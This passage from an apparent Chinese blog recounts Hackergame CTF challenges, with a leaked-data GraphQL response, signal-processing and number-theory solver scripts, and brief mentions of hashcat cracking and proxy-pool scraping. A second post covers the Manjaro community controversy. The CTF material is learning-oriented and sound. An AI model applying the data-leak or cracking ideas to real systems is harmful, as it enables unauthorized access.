<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;privateEmail&quot;</span><span class="punctuation">:</span><span class="string">&quot;flag&#123;dont_let_graphql_l3ak_data_dad4053dd4@hackergame.ustc&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>收工。。。</p>
<h3 id="Amnesia-轻度失忆（第一个flag）"><a href="#Amnesia-轻度失忆（第一个flag）" class="headerlink" title="Amnesia 轻度失忆（第一个flag）"></a>Amnesia 轻度失忆（第一个flag）</h3><blockquote>
<p>编译后 ELF 文件的 .data 和 .rodata 段会被清零。</p>
</blockquote>
<p>唯一整出来的binary题目（避免了binary和math双双爆零的惨状），虽然这个好像也不算binary，更像是在考我编译原理。使劲浑身解数。。。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> * hello;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    hello = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">13</span>);</span><br><span class="line">    hello[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">    hello[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    hello[<span class="number">2</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">    hello[<span class="number">3</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">    hello[<span class="number">4</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">    hello[<span class="number">5</span>] = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">    hello[<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    hello[<span class="number">7</span>] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    hello[<span class="number">8</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">    hello[<span class="number">9</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    hello[<span class="number">10</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">    hello[<span class="number">11</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    hello[<span class="number">12</span>] = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov $4,%eax;&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov $1,%ebx;&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov hello ,%ecx;&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;mov $13,%edx;&quot;</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;int $0x80&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="comment">//free(hello);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个小问题是它会内存泄漏，但是想不出什么更好的解答了。</p>
<h3 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h3><p>level0 简单，level1 也简单，就是实现一个循环呗。</p>
<p>剩下两个给我整不会了，人都傻了。</p>
<h3 id="p😭q"><a href="#p😭q" class="headerlink" title="p😭q"></a>p😭q</h3><p>我也不知道这道题何德何能排在倒数第三个，甚至还有400分的分值。在学了信号与系统、数字信号处理、数字图像处理、生物医学信号处理的我看来，这应该属于送分题。（不过之前都是用matlab做的，python的库都没用过）</p>
<p>先将gif每一帧转成图像再转成numpy的array再转成一维数组得到功率谱，傅立叶反变换回去得到音频信号……</p>
<p>等等。。。。它只有功率谱的幅度没有相位信息我可怎么恢复。难道要我猜一个相位吗？</p>
<p>搜了一下librosa，有一个自带的恢复库，用的是一个迭代估计的算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageSequence</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> librosa</span><br><span class="line"><span class="keyword">import</span> soundfile <span class="keyword">as</span> sf</span><br><span class="line"></span><br><span class="line">sample_rate = <span class="number">22050</span></span><br><span class="line">num_freqs = <span class="number">32</span></span><br><span class="line">quantize = <span class="number">2</span></span><br><span class="line">min_db = -<span class="number">60</span></span><br><span class="line">max_db = <span class="number">30</span></span><br><span class="line">fft_window_size = <span class="number">2048</span></span><br><span class="line">frame_step_size = <span class="number">512</span></span><br><span class="line">window_function_type = <span class="string">&#x27;hann&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.gif&#x27;</span>)</span><br><span class="line"><span class="built_in">iter</span> = ImageSequence.Iterator(im)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">spec = np.zeros(<span class="number">32</span>, dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> <span class="built_in">iter</span>:</span><br><span class="line">    <span class="comment"># print(&quot;image %d: mode %s, size %s&quot; % (index, frame.mode, frame.size))</span></span><br><span class="line">    frame.save(<span class="string">&quot;./imgs/frame%d.png&quot;</span> % index)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    image_arr = np.array(frame, dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    image_list = np.<span class="built_in">sum</span>(image_arr, axis=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(image_list)</span></span><br><span class="line"></span><br><span class="line">    image_list = image_list[<span class="number">3</span>::<span class="number">4</span>]</span><br><span class="line">    <span class="comment"># print(image_list)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(image_list.shape)</span></span><br><span class="line">    spec = np.vstack((spec, image_list))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(spec)</span><br><span class="line"></span><br><span class="line">np.savetxt(<span class="string">&#x27;output1.txt&#x27;</span>, spec, fmt=<span class="string">&quot;%d&quot;</span>)</span><br><span class="line"></span><br><span class="line">spec = np.delete(spec, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">melspectrogram = librosa.db_to_power(spec.T/<span class="number">2</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(melspectrogram.shape)</span></span><br><span class="line"></span><br><span class="line">audio_signal = librosa.feature.inverse.mel_to_audio(</span><br><span class="line">    melspectrogram,</span><br><span class="line">    n_iter=<span class="number">32</span>,</span><br><span class="line">    sr=sample_rate,</span><br><span class="line">    n_fft=fft_window_size,</span><br><span class="line">    hop_length=frame_step_size,</span><br><span class="line">    window=window_function_type</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(audio_signal, audio_signal.shape)</span></span><br><span class="line">sf.write(<span class="string">&#x27;test.wav&#x27;</span>, audio_signal, sample_rate)</span><br></pre></td></tr></table></figure>

<p>好的，秒了。（怎么有种回到本科写课堂作业的感觉）</p>
<p>声音是有了，但是这个相位好像还是不太对的样子。我超，回声不绝于耳。。。</p>
<p>调一下参数，让他多迭代几轮<code>n_iter=8192,</code>，行了，现在清晰度有个高中大喇叭放英语早读听力的样子。</p>
<p><strong>衬衫的价格是九磅十五便士，现在你有十秒钟时间，将Flag填到输入框上</strong>…….</p>
<h2 id="看起来有点头绪但是没做的题目"><a href="#看起来有点头绪但是没做的题目" class="headerlink" title="看起来有点头绪但是没做的题目"></a>看起来有点头绪但是没做的题目</h2><p>懒癌又犯了，周六休息一会，周五天气太好了，还有其他事情要做，算了</p>
<h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>由于我找不到中科大少年班的神通，而我自己的数论还停留在高中水平（当年数竞还过了校队选拔，然后上来就听了好几节数论和组合，直接退出了（后悔，现在就是非常后悔））</p>
<p>只能找山大网安的大二学弟来帮帮我看看这个密码学的问题，问问这种形式该怎么解(已知n, p, q, c)</p>
<p>$$<br>a^n mod(p*q) &#x3D; c<br>$$</p>
<p>他当场就给我秒了，还随手写了3页。</p>
<p>然后问题是怎么跑出这个p来，这次学弟也没什么好办法了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>():</span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) %</span><br><span class="line">                              x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br></pre></td></tr></table></figure>

<p>一开始我是这样跑的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, y+<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">sum</span> = (<span class="built_in">sum</span>*i) % x</span><br><span class="line">    <span class="comment"># print(sum)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sum的值是&quot;</span>, <span class="built_in">sum</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sum的值是&quot;</span>, <span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p>结果一跑就是一天，看到我的5600g只有1个CPU在跑，我决定整个multiprocessing（本来想用Golang整一个，但是Golang的数值计算库不太行，还得去用那个难用的<code>math/big</code>包）</p>
<p>结果再次发现，甚至上了multiprocessing，反而更慢了。</p>
<p>于是我决定搜一下，结果就找到了这个网站的两种算法：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvY29tcHV0ZS1uLXVuZGVyLW1vZHVsby1wLw==">Compute n! under modulo p<i class="fa fa-external-link-alt"></i></span></p>
<p>哦，有个复杂度$O((p-n)*Logn)$的算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3 program to comput</span></span><br><span class="line"><span class="comment"># n! % p using Wilson&#x27;s Theorem</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Utility function to do modular</span></span><br><span class="line"><span class="comment"># exponentiation. It returns (x^y) % p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">x, y, p</span>):</span><br><span class="line"></span><br><span class="line">    res = <span class="number">1</span>  <span class="comment"># Initialize result</span></span><br><span class="line">    x = x % p  <span class="comment"># Update x if it is more</span></span><br><span class="line">    <span class="comment"># than or equal to p</span></span><br><span class="line">    <span class="keyword">while</span> (y &gt; <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If y is odd, multiply</span></span><br><span class="line">        <span class="comment"># x with result</span></span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>):</span><br><span class="line">            res = (res * x) % p</span><br><span class="line"></span><br><span class="line">        <span class="comment"># y must be even now</span></span><br><span class="line">        y = y &gt;&gt; <span class="number">1</span>  <span class="comment"># y = y/2</span></span><br><span class="line">        x = (x * x) % p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to find modular inverse</span></span><br><span class="line"><span class="comment"># of a under modulo p using Fermat&#x27;s</span></span><br><span class="line"><span class="comment"># method. Assumption: p is prime</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">a, p</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> power(a, p - <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Returns n! % p using</span></span><br><span class="line"><span class="comment"># Wilson&#x27;s Theorem</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modFact</span>(<span class="params">n, p</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># n! % p is 0 if n &gt;= p</span></span><br><span class="line">    <span class="keyword">if</span> (p &lt;= n):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize result as (p-1)!</span></span><br><span class="line">    <span class="comment"># which is -1 or (p-1)</span></span><br><span class="line">    res = (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Multiply modulo inverse of</span></span><br><span class="line">    <span class="comment"># all numbers from (n+1) to p</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>, p):</span><br><span class="line">        res = (res * modInverse(i, p)) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Driver code</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line"><span class="comment"># y = 10</span></span><br><span class="line"></span><br><span class="line">n = y</span><br><span class="line">p = x</span><br><span class="line"><span class="built_in">print</span>(modFact(n, p))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This code is contributed by ihritik</span></span><br></pre></td></tr></table></figure>

<p><strong>只用了1分钟</strong>就跑了出来。这算法好强！</p>
<p>我把这个做法发给学弟，学弟表示：</p>
<p>“可以，回头我看看”<br>“<strong>我比较关心这个是怎么构造出来和怎么证明的</strong>”<br>“<strong>初等数论比较巧妙</strong>”<br>“<strong>可以看一下</strong>”  </p>
<p>听完学弟的话，接下来的内容我不太想做了。<br>我这样数理基础不扎实的菜狗（尤其是数论，一窍不通），做出来也<strong>改变不了我是个数论白痴的事实</strong>。都是些trival的东西了，<strong>有这个时间折腾这些应该去系统的补习一下数论</strong>。</p>
<h3 id="拼多多砍一刀"><a href="#拼多多砍一刀" class="headerlink" title="拼多多砍一刀"></a>拼多多砍一刀</h3><p>FLAG 助力大红包，这个东西应该挂一个爬虫代理池能做。但是这个方法好像太暴力了点，而且我不想再爬东西了，免费的那几个IP池都不太好用，要钱的又不想掏钱。</p>
<h3 id="minecraft"><a href="#minecraft" class="headerlink" title="minecraft"></a>minecraft</h3><p>随便乱走亮了两盏灯，还有一盏。看起来应该F12找找线索，有一个flag.js的东西，但是它一堆16进制的变量和函数名，看起来挺费劲，算了，不看了。</p>
<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>应该就是根据奇偶校验和他给的打码过程的那个python文件。上一次做二维码和奇偶校验的东西还是大二上数字电路的时候。</p>
<p>看起来像是第十版二维码，结果打开qrazybox想手动修复一下最高只有ver.9</p>
<p>然后写了十几行发现好像这个东西要枚举遍历？？可能的二维码团还不止一种。（不知道是不是我漏了什么条件，但看起来还原出来确实不止一种）</p>
<p>周五周六天气真好，成都难得出太阳，不做了，出去玩。</p>
<h2 id="以为会做然而被乱杀到怀疑人生的题"><a href="#以为会做然而被乱杀到怀疑人生的题" class="headerlink" title="以为会做然而被乱杀到怀疑人生的题"></a>以为会做然而被乱杀到怀疑人生的题</h2><h3 id="Amnsia记忆清除"><a href="#Amnsia记忆清除" class="headerlink" title="Amnsia记忆清除"></a>Amnsia记忆清除</h3><p>抹除掉ELF文件的<code>.text</code>段，完全不会</p>
<h3 id="LUKS"><a href="#LUKS" class="headerlink" title="LUKS"></a>LUKS</h3><p>就觉得我这么长时间的Linux白用了，整不出来。我只会hashcat爆破，Hashcat爆破又没啥意思，算了，放弃。</p>
<h3 id="RAID修复"><a href="#RAID修复" class="headerlink" title="RAID修复"></a>RAID修复</h3><p>文件系统白学了，直接不会，白给。RAID-0做不出来，RAID-5也做不出来。</p>
<h3 id="赛博厨房后两问"><a href="#赛博厨房后两问" class="headerlink" title="赛博厨房后两问"></a>赛博厨房后两问</h3><p>直接人都傻了，找不到规律，根本找不到。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>现在是周六中午12点，总排名187&#x2F;2679，很幸运没有掉出200名。</p>
<blockquote>
<p>当前分数：1600， 总排名：187 &#x2F; 2679<br>binary：150 ， general：1050 ， math：0 ， web：400</p>
</blockquote>
<p>今年是第一次参见Hackergame，玩的很开心。binary的题比往年多了很多，不过我一个都不会，好在有个打印<code>Hello, world!</code>的题，很幸运没有爆零。  </p>
<p>当然，general和web题还是给了我一点信心，让我有种我上我也行的感觉，不过打开排行榜看到mcfx乱秒的样子，嗯，我是傻逼。</p>
<p>主要感想就是数理基础太差，数论是真的是一窍不通，这几个月正好有空，准备去恶补一下数学。    </p>
<p>当然进前100名和CTF师傅们以及天神下凡的mcfx合影留念是无望了，明年再来玩耍吧。欢度周末去了，再见。   </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>hackergame</tag>
        <tag>UTF-8</tag>
      </tags>
  </entry>
  <entry>
    <title>你好，Manjaro。再见，Manjaro。</title>
    <url>/ff0e/</url>
    <content><![CDATA[<p>洗手.jpg</p>
<span id="more"></span>

<p>虽然有一些办法不重装从Manjaro跑路到Arch，</p>
<!-- 
比如reddit上这篇帖子[Guide for Manjaro to Arch migration (the dirty way)](https://www.reddit.com/r/ManjaroLinux/comments/jx42ar/guide_for_manjaro_to_arch_migration_the_dirty_way/)
 -->
<p>但是你会遇到各种Manjaro魔改的遗留问题（尤其是加入了相当多魔改的最新版Manjaro,据说很早以前比较容易直接滚成Arch）,<strong>the dirty way</strong>。</p>
<p>我甚至觉得上面这个方法想得到一个纯净的Arch，难度比你去arch的<span class="exturl" data-url="aHR0cHM6Ly9hcmNoaXZlLmFyY2hsaW51eC5vcmcvaXNvLw==">archive<i class="fa fa-external-link-alt"></i></span>下载一个10年前的iso（真正的有图形界面的arch安装镜像哦，官方的）再借助<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQXJjaF9MaW51eF9BcmNoaXZl">Arch Linux Archive<i class="fa fa-external-link-alt"></i></span>（Rollback Machine）等一点一点滚到最新都麻烦。（至少去年Arch群友们玩过这个活动，勉强可行）</p>
<p>直接重装一个原味Arch应该是最快的，也是后遗症最小的。总有人觉得直接不重装换源成Arch比较简单，很遗憾，这其实是最麻烦的一种方法。天上不会掉馅饼。</p>
<h2 id="更新–再见Manjaro，"><a href="#更新–再见Manjaro，" class="headerlink" title="更新–再见Manjaro，"></a>更新–再见Manjaro，</h2><p>前一阵Manjaro社区出的争吵让我跑路了，Manjaro之前用的还比较舒服（当然直到现在都比较舒服），以后就不知道怎么样了。外面Arch社区骂声一片，里面还总在内斗，不断有人出走，前几周连jonathon都气走了（跑去隔壁endeavour os了）</p>
<p>jonathon的声明在<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5tYW5qYXJvLm9yZy90L2NoYW5nZS1vZi10cmVhc3VyZXItZm9yLW1hbmphcm8tY29tbXVuaXR5LWZ1bmRzLzE1NDg4OA==">这篇帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>过程大概是这样的，philm（Manjaro的CEO，反正Manjaro社区的不少人都觉得此人非常讨厌）挪用社区赞助捐款2000欧元，用于给自己买的电脑。这次购买并没有跟掌钱管家jonathon商量，也没有在社区内征得同意。jonathon觉得按照规定这钱只能用于Manjaro项目的网站建设、项目推广之类的，不是给你们恰烂钱的，然后在论坛发帖子怼philm，然后帖子被删了一次，jonathon的管理员也被撤了。帖子下面众人纷纷表示philm不回应道歉以后再也不捐助Manjaro了，不少人表示以后再也不用Manjaro了，并考虑跑路到KDE Neon、Kubuntu、Arch、Endeavour OS。</p>
<p>philm的回应闪烁其辞，一直说事情不是大家想的那个样子的，但是大家怼他让他公布他和jonathon的完整聊天记录他又不肯。最后philm屁事没有继续担任Manjaro的领袖，jonathon跑路去了Endeavour OS。</p>
<h2 id="再次更新–pamac不慎向aur官网打出了DDoS"><a href="#再次更新–pamac不慎向aur官网打出了DDoS" class="headerlink" title="再次更新–pamac不慎向aur官网打出了DDoS"></a>再次更新–pamac不慎向aur官网打出了DDoS</h2><p>Manjaro的Pamac不小心DDoS了aur.archlinux.org， 每秒40多来自pamac的请求，aur遭到暴击。<br>很喜欢reddit评论里的一句话：Just when I thought I couldn’t hate manjaro any more.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9tejNiaXovaXNfdGhlX2F1cl9kb3duX2Zvcl9ldmVyeW9uZS8=">https://www.reddit.com/r/archlinux/comments/mz3biz/is_the_aur_down_for_everyone/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIubWFuamFyby5vcmcvYXBwbGljYXRpb25zL3BhbWFjLy0vaXNzdWVzLzEwMTc=">https://gitlab.manjaro.org/applications/pamac/-/issues/1017<i class="fa fa-external-link-alt"></i></span>  </p>
<h2 id="关于社区文化和商业化"><a href="#关于社区文化和商业化" class="headerlink" title="关于社区文化和商业化"></a>关于社区文化和商业化</h2><p>微软的商业化非常成功，苹果和安卓也是。</p>
<p>即使Linux桌面发行版这种反商业风气比较浓的地方，商业化也不意味着坏事。</p>
<p>REHL也还算不错，名声也比较好；Canonical争议比较大，虽然不招Debian等开源社区的喜欢，早年间也算对推广Linux桌面有贡献，后面snap等有点evil化了</p>
<p>当然，或许还要算上国内的Deepin。（奔着Windows的竞品去的，和其他Linux社区的画风和定位不太一样，倒是和安卓的定位挺像，总不是坏事）</p>
<p>然而Manjaro的商业化我很不看好，就我目前看到的，对上游没有太多贡献，反而给上游带来了更多的麻烦。而且还有一点，Manjaro挪用社区捐款到公司口袋里面，虽然都是Manjaro，但是这在眼里揉不得沙子的很多开源社区人严重这已经是重罪了。当然，也不全是坏事，就不少人的体验来看，至少用起来比Ubuntu舒服不少。</p>
<p>红帽的商业化就很成功，一开始就是给企业提供服务器支持等商业化内容，挣了钱反哺Linux社区。Deepin有不少情怀，比某些充满国家经费和金钱气息的发行版好不少，打包了很多deepin-wine也好DDE也好争取到国内不少公司配适Linux也好，都还算不错。Deepin虽然也带来了大量的小白，但是没有涌到Debian等社区去造成很多麻烦。</p>
<p>我们重温一下“b站或许会倒闭但绝不会变质”的典中典（不知不觉蒙古上单发表重要讲话也一年了，笑）。为什么b站就被骂的这么厉害呢？优酷土豆乐视爱奇艺哪个广告不比这个多，开头的广告还无法跳过。论视频质量和推荐无营养的视频、还有强制使用手机app、以及抄袭和营销号，跟抖音快手比现在的b站已经算良心了吧。<br>就像早期的b站那样，这是一群小圈子和爱好者，首先这不是一个商品，这是一个社区，没多少营销号也没有广告，很多人是倾注心血去做视频的，感情很深，氛围也很好。（国内其他视频网站可能也就被封的内涵段子“段友”（现 皮皮虾）有早期b站用户那样类似的归属感了，什么？a站？a站还活着啊？）<br>当然视频网站的运行成本比较高，靠用爱发电一般做不了很大（就算商业化吃香难看都难免亏损，比如爱奇艺），人多了以后商业化是难免的。</p>
<p>相信大家都能看到Arch社区对Manjaro用户的态度，不管是在archlinuxcn论坛或者irc、电报，还是在国外的reddit社区等，……*&amp;（*%&amp;&amp;￥人*&amp;……（此处省略500字）</p>
<p>不少Arch用户和维护者对Manjaro的恶意大概就像b站老用户这样（你看苹果微软不是比Manjaro邪恶多了，但是他们敌视这些的次数可能比Manjaro要少）</p>
<p>Arch背后没有商业化背景，甚至没有红帽或Canonical这样的公司，然而还是有了比背靠大公司的发行版更多的包（算上野包）和更丰富的wiki(可能没有红帽的wiki好，但是中文翻译多)，这都是Arch的维护者和用户们用爱发电一砖一瓦的心血。它不像Windows和Mac或者红帽的RHEL那样一开始就是一个商品，而且Arch的特点也不太适合做服务器或者商业化。（可能gentoo的商业化用途都比Arch多，还是有一点运维在用gentoo当服务器的）Manjaro的商业化，和原来的社区格格不入。很多地方直接和arch的不少理念和作风背道而驰。<br>不幸的是Manjaro的社区也有不少伸手党，大量安利Manjaro的视频和帖子都只说好用、好看、好安装，绝口不提社区文化和用户责任。（<strong>而且还在教程里让你添加archlinuxcn的源，同时还说Manjaro更稳定</strong>）</p>
<p>曾经的Arch的ISO有GUI安装界面的（10年前），后来就没了，而官方Wiki上的安装指南也对新手不那么友好了（越来越不友好了）。这里面一个比较重要的原因是过滤小白用户和伸手党，提高用户门槛。这个策略应该还是比较成功的，然而这挡不住Manjaro等发行版的用户。（许多完全有能力安装、使用Archlinux甚至为Archlinux做贡献的用户一开始都被吓到了Manjaro，走了一些弯路，兜兜转转又被洗手到了Arch）<br>今年愚人节当天Arch出了一个<span class="exturl" data-url="aHR0cHM6Ly9hcmNobGludXgub3JnL3BhY2thZ2VzL2V4dHJhL2FueS9hcmNoaW5zdGFsbC8=">archinstall<i class="fa fa-external-link-alt"></i></span>的TUI安装方式（还在extra仓库里），当时我一度以为是愚人节玩笑。不过试了一下，还是与其他发行版的GUI安装界面相去甚远。</p>
<p>短期看来不会，长期看来应该也不会。可能是无奈之举吧，暂时也找不到太多比提高安装门槛更好的过滤伸手党的办法了。</p>
<p>这种过滤机制类似很多论坛（比如52pojie等）的邀请制、等级制，早期知乎也是这样的邀请制（甚至还要求实名）。前面提到的b站早期也是要答题的（而且题还很难）。<br>这些做法确实很有效，很多论坛都靠邀请制挡住了伸手党和发广告的。知乎在开放邀请后内容质量的下滑速度经历过的人应该印象很深，b站也是。我还是个真·小学生的时候赶上了许多中文论坛的最后余辉，现在再想起那些倒闭的、变质的、冷冷清清没人说话的论坛曾经高朋满座的热闹的场面还是不胜唏嘘。Manjaro给Arch带来的影响，总让我想起曾经经历过的社区没落过程。。。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9yZW50cnkuY28vbWFuamFyby1jb250cm92ZXJzaWVz">Manjaro Controversies<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9vcmlnaW5jby5kZS9NYW5qYXJvLUNvbnRyb3ZlcnNpZXMv">【译】Manjaro 的争议<i class="fa fa-external-link-alt"></i></span> 源码菊巨的中文翻译<br><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2xpbnV4NG5vb2JzL2NvbW1lbnRzL2ZuMmlxOC93aHlfeW91X3Nob3VsZG50X3VzZV9tYW5qYXJvLw==">Why You shouldn’t use Manjaro.<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2xpbnV4cXVlc3Rpb25zL2NvbW1lbnRzL2JycnBxci93aHlfbm90X21hbmphcm8v">Why not Manjaro?<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ3NTE0MTIyL2Fuc3dlci8xMDc0MTI1NDk=">Ubuntu 推出的Snap应用架构有什么深远意义? - farseerfc的回答<i class="fa fa-external-link-alt"></i></span>  </p>
<h3 id="他山之石"><a href="#他山之石" class="headerlink" title="他山之石"></a>他山之石</h3><p>Arch的社区属性要远远大于工具属性和商品属性，我们看看那些耳熟能详的社区。这里扔了很多知乎的链接，是因为，我觉得“btw I use arch”和部分arch粉丝在众人眼中的快要溢出优越感，和早期（13年前）中期（15年前）的知乎特别像。很奇怪openSUSE社区和gentoo社区等都没这种arch这种说不出来风气，如果非要找个相似的，可能是部分vim党（emacs党类比gentoo）<br>还能再诞生一个像早期知乎氛围和内容质量一样的社区吗？我觉得不能（限定简中，长城之内）。还能再诞生一个像arch这样的社区吗？我觉得也不能。有些东西是90年代和2000年初错过就不再有的，未来是商业公司、手机app、短视频直播，自由软件和社区、理想、小众社区诞生的机会不多了。（AOSC等地方能看到火苗和种子，然而每次我看到十年前整个互联网的氛围和现在的样子，还是有点悲观）</p>
